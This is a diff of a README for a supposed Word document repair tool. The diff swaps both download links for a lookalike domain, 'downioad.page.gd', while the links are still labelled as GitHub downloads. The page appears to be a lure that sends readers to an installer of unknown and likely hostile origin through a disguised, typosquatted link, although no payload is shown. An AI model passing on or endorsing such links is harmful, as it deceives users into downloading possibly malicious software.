@@ -2,7 +2,7 @@
 
 Word Repair Tool is a comprehensive software application designed to recover and repair corrupted Microsoft Word documents. Built for Windows 10 and Windows 11 users, it offers a seamless experience to restore important files damaged by crashes, viruses, or file system errors. In 2026, this tool remains the top choice for document recovery due to its advanced algorithms and user-friendly design.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -72,4 +72,4 @@ Word Repair Tool is regularly updated to maintain compatibility with the latest 
 
 For the latest version of Word Repair Tool, please visit the download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
